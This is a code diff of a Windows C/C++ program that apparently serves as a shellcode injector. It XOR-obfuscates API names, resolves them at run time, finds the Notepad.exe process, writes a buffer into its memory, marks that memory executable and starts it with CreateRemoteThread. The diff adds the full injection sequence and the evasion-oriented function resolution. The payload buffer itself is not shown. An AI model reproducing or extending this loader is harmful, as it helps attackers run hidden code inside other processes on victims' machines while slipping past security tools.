@@ -1,5 +1,6 @@
 #include <windows.h>
 #define TH32CS_SNAPPROCESS 0x00000002 //Used by CreateToolhelp32Snapshot.
+#define REMOTE_MEM_BUFF_SIZE 6969
 #include <stdlib.h>
 #include <stdio.h>
 #define FAVICON_ICO 
@@ -23,7 +24,9 @@ To Do
 			
 			Bugs
 	[] CreateToolhelp32Snapshot doesnt seem to work with GetProcAddress when provided in any way other than a string literal??
+	[] VirtualProtectEx doesnt seem to work with GetProcAddress when provided in any way other than when I provide VirtualProtectEx as a string literal
 	[] Notepad.exe is deXOR'd into notepad.bfl. This obviously is preventing implementation of XOR functionality into the strcmpiA function.
+		
 
 			Later 
 [] Base64 encode/decode
@@ -73,7 +76,7 @@ unsigned char targetProcess[] = { 0xd, 0x1, 0x12, 0x2f, 0x5, 0x28, 0x5, 0x48, 0x
 unsigned char virtualAllocEx[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27, 0x2b, 0x3e }; 
 unsigned char writeProcessMemoryStr[] = { 0x14, 0x1c, 0xf, 0x3e, 0x10, 0x19, 0x13, 0x9, 0x27, 0x35, 0xb, 0x37, 0x23, 0x23, 0x19, 0x2b, 0x21, 0x11 };
 unsigned char openProcessStr[] = { 0xc, 0x1e, 0x3, 0x24, 0x25, 0x3b, 0xe, 0x5, 0x21, 0x23, 0xb };
-
+unsigned char virtualProtectExStr[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x36, 0x36, 0x3f, 0xc, 0x21, 0xd, 0x32, 0x31, 0x3c };
 
 unsigned int targetProcessId; //Not XOR'd as its only a predec for a runtime variable.
 //WCHAR target[] = "Notepad.exe";
@@ -89,7 +92,6 @@ This issue only happens when CreateToolHelp32Snapshot, is provided in any way ot
 I could not replicate this issue with any of the other GetProcAddress calls.....What The Fuck????
 Its definitely somehow, my doing.  
 */
-
 
 
 
@@ -110,6 +112,15 @@ typedef struct PROCESSENTRY32W //I dont want to import TlHelp32.h, so I am going
 } PROCESSENTRY32W;
 
 
+typedef BOOL(WINAPI* functVirtualProtectEx)(
+	HANDLE hHandle,
+	LPVOID lpAddress, //pointer to target remote buffer
+	SIZE_T dwSize, //sizeof memory region (buffer)
+	DWORD flNewProtect, //new protect value
+	PDWORD lpflOldProtect //pointer to DWORD to store the old protect value.
+	);
+
+
 typedef BOOL(WINAPI* functWriteProcessMemory)(
 	HANDLE hProcess,
 	LPVOID lpBaseAddress,
@@ -119,7 +130,7 @@ typedef BOOL(WINAPI* functWriteProcessMemory)(
 	);
 
 
-typedef HANDLE(WINAPI* functCreateRemoteProcess)(
+typedef HANDLE(WINAPI* functCreateRemoteThread)(
 	HANDLE hProcess,	//Hanndle for the process, for which the thread will be created in.
 	LPSECURITY_ATTRIBUTES lpthreadAtrributes,
 	SIZE_T dwStackSize,
@@ -236,11 +247,15 @@ int main()
 	functProcess32First pProcess32First;
 	functCreateToolHelp32Snapshot pCreateToolHelp32Snapshot;
 	functProcess32Next pProcess32Next;
-	functCreateRemoteProcess pCreateRemoteProcess;
+	functCreateRemoteThread pCreateRemoteThread;
 	functVirtualAllocEx pVirtualAllocEx;
 	functWriteProcessMemory pWriteProcessMemory;
 	functOpenProcess pOpenProcess;
-	HANDLE targetProc;
+	functVirtualProtectEx pVirtualprotectEx;
+	HANDLE targetProc{};
+	LPVOID remMemoryBuffer =NULL;
+	DWORD oldProtectValue;
+
 		pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length)); //point our function pointer to starting code of VirtualAlloc
 	if (pVirtualAlloc == NULL)
 	{
@@ -298,10 +313,10 @@ int main()
 	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
 	XOREncryptLPC(Process32Next, sizeof(Process32Next), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
 
-	pCreateRemoteProcess = (functCreateRemoteProcess)(GetProcAddress(GetModuleHandle((LPCSTR)(XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length))), (LPCSTR)(XORDecryptLPC(CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length))));
-	if (pCreateRemoteProcess == NULL)
+	pCreateRemoteThread = (functCreateRemoteThread)(GetProcAddress(GetModuleHandle((LPCSTR)(XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length))), (LPCSTR)(XORDecryptLPC(CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length))));
+	if (pCreateRemoteThread == NULL)
 	{
-		printf("pCreateRemoteProcess IS NULL ptr! \n");
+		printf("pCreateRemoteThread IS NULL ptr! \n");
 	}
 	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
 	XOREncryptLPC(CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
@@ -331,6 +346,14 @@ int main()
 	XOREncryptLPC(openProcessStr, sizeof(openProcessStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
 
 
+//	pVirtualprotectEx = (functVirtualProtectEx)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), ((LPCSTR)(XORDecryptLPC(virtualProtectExStr, sizeof(virtualProtectExStr), XORKey, XORKey_length))));
+	pVirtualprotectEx = (functVirtualProtectEx)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)"VirtualProtectEx");
+	if (pVirtualprotectEx == NULL)
+	{
+		printf("virtualProtectEx IS NULL PTR \n");
+	}
+	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
+	XOREncryptLPC(virtualProtectExStr, sizeof(virtualProtectExStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed
 
 
 
@@ -380,8 +403,6 @@ int main()
 			
 		}
 		//LPCWSTR fortesting = test.szExeFile;
-		std::cout << "PPID" << test.th32ParentProcessID << "\n";
-		printf(test.szExeFile);
 		if (lstrcmpiA((LPCSTR)test.szExeFile, "Notepad.exe") == 0)
 		{
 			printf("FOUND A MATCH! FOUND A MATCH FOUND A MATCH FOUND A MATCH");
@@ -394,7 +415,7 @@ int main()
 
 	if (targetProcessId != 0)
 	{
-		targetProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)targetProcessId);
+		targetProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)targetProcessId);
 		if (targetProc == NULL)
 		{
 			printf("HANDLE targetProc, initialization via OpenProcess DID NOT WORK! its null \n");
@@ -409,8 +430,27 @@ int main()
 	}
 
 
-	pVirtualAllocEx(targetProc, NULL, 4000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	remMemoryBuffer = pVirtualAllocEx(targetProc, NULL, REMOTE_MEM_BUFF_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	if (remMemoryBuffer == NULL)
+	{
+		printf("remMemoryBuffer, returned NULL. Could not allocate memory in the remote process");
+	}
+	else
+	{
+		printf(" \n Remote buffer at 0x%p \n", remMemoryBuffer);
+		BOOL isLocalBufferWrittenToRemote = pWriteProcessMemory(targetProc, remMemoryBuffer, memoryBuffer, REMOTE_MEM_BUFF_SIZE, NULL);
+		printf("did memory write to remote proc: %d \n\n", isLocalBufferWrittenToRemote);
+		isExec = pVirtualprotectEx(targetProc, remMemoryBuffer, REMOTE_MEM_BUFF_SIZE, PAGE_EXECUTE_READ,&oldProtectValue);
 
+		if (isExec == TRUE)
+		{
+			HANDLE RemoteThread = pCreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)remMemoryBuffer, 0, NULL, NULL);
+			printf("Remote thread status %p \n", RemoteThread);
+			WaitForSingleObject(RemoteThread, NULL);
+		}
+
+
+	}
 
 
 
